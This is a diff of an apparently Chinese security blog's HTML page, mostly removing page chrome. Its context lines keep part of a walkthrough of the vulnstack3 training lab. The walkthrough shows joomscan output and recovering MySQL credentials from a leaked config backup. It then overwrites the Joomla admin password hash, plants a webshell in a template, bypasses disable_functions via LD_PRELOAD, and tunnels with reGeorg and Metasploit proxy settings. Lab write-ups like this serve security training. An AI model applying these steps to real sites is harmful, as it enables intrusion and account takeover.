@@ -203,23 +203,12 @@
 </head>
 
     
-        <body class="post-body">
-    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
-    
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/" >Yoga7xm&#39;s Blog</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name">域渗透之vulnstack3</a>
-            </div>
-    </div>
     
     <a class="home-link" href=/>Yoga7xm's Blog</a>
 </header>
@@ -231,76 +220,24 @@
 
 
 
-
-height:50vh;
 ">
     
     <!-- 主页  -->
-    
-    
-    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-            
-            域渗透之vulnstack3
-            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-            
-            <!-- 404 -->
-            
         </p>
         <!-- 文章页meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class= post-intro-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "内网渗透">内网渗透</a>
-    
-        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "vulnstack">vulnstack</a>
-    
-</div>
-                
-                
-                    <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">756</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/12/09</span>
-                    
-                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                        <span class="iconfont-archer">&#xe602;</span>
-                        <span id="busuanzi_value_page_pv"></span>
-                    </span>
-                    
-                    <span class="shareWrapper">
-                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
-                        <span class="shareText">Share</span>
-                        <ul class="shareList">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -410,23 +347,23 @@ height:50vh;
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u http://192.168.134.129/</span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla 3.9.12</span><br><span class="line"></span><br><span class="line">[+] Core Joomla Vulnerability</span><br><span class="line">[++] Target Joomla core is not vulnerable</span><br><span class="line"></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing : </span><br><span class="line">http://192.168.134.129/administrator/components</span><br><span class="line">http://192.168.134.129/administrator/modules</span><br><span class="line">http://192.168.134.129/administrator/templates</span><br><span class="line">http://192.168.134.129/images/banners</span><br><span class="line"></span><br><span class="line">[+] admin finder</span><br><span class="line">[++] Admin page : http://192.168.134.129/administrator/</span><br><span class="line"></span><br><span class="line">[+] Checking robots.txt existing</span><br><span class="line">[++] robots.txt is found</span><br><span class="line">path : http://192.168.134.129/robots.txt </span><br><span class="line"></span><br><span class="line">Interesting path found from robots.txt</span><br><span class="line">http://192.168.134.129/joomla/administrator/</span><br><span class="line">http://192.168.134.129/administrator/</span><br><span class="line">http://192.168.134.129/bin/</span><br><span class="line">http://192.168.134.129/cache/</span><br><span class="line">http://192.168.134.129/cli/</span><br><span class="line">http://192.168.134.129/components/</span><br><span class="line">http://192.168.134.129/includes/</span><br><span class="line">http://192.168.134.129/installation/</span><br><span class="line">http://192.168.134.129/language/</span><br><span class="line">http://192.168.134.129/layouts/</span><br><span class="line">http://192.168.134.129/libraries/</span><br><span class="line">http://192.168.134.129/logs/</span><br><span class="line">http://192.168.134.129/modules/</span><br><span class="line">http://192.168.134.129/plugins/</span><br><span class="line">http://192.168.134.129/tmp/</span><br><span class="line"></span><br><span class="line">[+] Checking sensitive config.php.x file</span><br><span class="line">[++] Readable config file is found </span><br><span class="line"> config file path : http://192.168.134.129/configuration.php~</span><br></pre></td></tr></table></figure>
 
 <p>程序版本号、核心配置文件和后台地址都给扫描出来了，访问该地址</p>
-<p><img src="/2019/12/09/vulnstack3/config.png" alt></p>
+<p><img src="/config.png" alt></p>
 <p>拿到mysql的账号密码，而且目标机器也开启了3306.连他数据库。进入users表，拿到管理员的账号密码密文<code>administrator:$10$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2</code></p>
 <p>爆破hash无果…joomla还有一种劫持管理员账号的方法，进入<code>ucm_history</code>表，session值为空，陷入僵局…只能替换密文了<code>d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199</code>密码为<code>secret</code></p>
-<p><img src="/2019/12/09/vulnstack3/admin.png" alt></p>
+<p><img src="/admin.png" alt></p>
 <p>然后就是  Extensions-&gt;Templates-&gt;Templates 找到 Beez3 进去创建一个新的一句话文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.134.129/templates/beez3/img_class.php</span><br></pre></td></tr></table></figure>
 
 <p>蚁剑连接上来，虚拟终端尝试命令执行查看用户权限，全部ret=127报错。应该是disable_functions的原因，查看下phpinfo，果不其然</p>
-<p><img src="/2019/12/09/vulnstack3/dis.png" alt> <code>putenv()</code>函数没有被禁用，可以利用LD_PRELOAD劫持去Bypass，<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">项目</a>给出了配套的小马和c源码，直接上传相关的文件，然后访问带着参数就能成功执行命令</p>
-<p><img src="/2019/12/09/vulnstack3/bypass.png" alt></p>
+<p><img src="/dis.png" alt> <code>putenv()</code>函数没有被禁用，可以利用LD_PRELOAD劫持去Bypass，<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">项目</a>给出了配套的小马和c源码，直接上传相关的文件，然后访问带着参数就能成功执行命令</p>
+<p><img src="/bypass.png" alt></p>
 <p>查看IP才知道，这是内网的一台机器，然后借助129给反代出来的。只能用reGeorg建立一个socket代理。将<code>tunnel.nosocket.php</code>上传至目标网站</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 reGeorgSocksProxy.py -p 1234 -u http://192.168.134.129/templates/beez3/tunnel.nosocket.php</span><br></pre></td></tr></table></figure>
 
 <p>msf生成一个正向的shell，上传至网站，msf设置代理，小马加权限然后执行，最后反弹出来一个session。这里提一下msf设置代理的命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks5:127.0.0.1:1234 #socks代理</span><br><span class="line">setg ReverseAllowProxy true  #双向转发</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/12/09/vulnstack3/ubuntu.png" alt></p>
+<p><img src="/ubuntu.png" alt></p>
 
     </article>
     <!-- license  -->
@@ -437,11 +374,6 @@ height:50vh;
             
         </li>
         <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/12/06/offensive/" title= "域渗透之Offensive">
-                    <div class="prevTitle">域渗透之Offensive</div>
-                </a>
             
         </li>
     </ul>
@@ -543,24 +475,6 @@ height:50vh;
 </footer>
     </div>
     <!-- toc -->
-    
-    <div class="toc-wrapper" style=
-    
-
-
-
-
-
-
-
-top:50vh;
-
-    >
-        <div class="toc-catalog">
-            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-        </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Abstract"><span class="toc-number">1.</span> <span class="toc-text">Abstract</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web入侵"><span class="toc-number">2.</span> <span class="toc-text">Web入侵</span></a></li></ol>
-    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1281,20 +1195,9 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 52
+        Total : 51
         </div>
         <!-- search  -->
         
@@ -1307,11 +1210,6 @@ top:50vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/09</span><a class="archive-post-title" href= "/2019/12/09/vulnstack3/" >域渗透之vulnstack3</a>
-        </li>
     
     
         <li class="archive-post-item">
@@ -1630,9 +1528,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="vulnstack"><span class="iconfont-archer">&#xe606;</span>vulnstack</span>
     
-        <span class="sidebar-tag-name" data-tags="weblogic"><span class="iconfont-archer">&#xe606;</span>weblogic</span>
-    
         <span class="sidebar-tag-name" data-tags="xxe"><span class="iconfont-archer">&#xe606;</span>xxe</span>
+    
+        <span class="sidebar-tag-name" data-tags="weblogic"><span class="iconfont-archer">&#xe606;</span>weblogic</span>
     
         <span class="sidebar-tag-name" data-tags="cryptology"><span class="iconfont-archer">&#xe606;</span>cryptology</span>
     
@@ -1701,8 +1599,6 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
-    
-        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
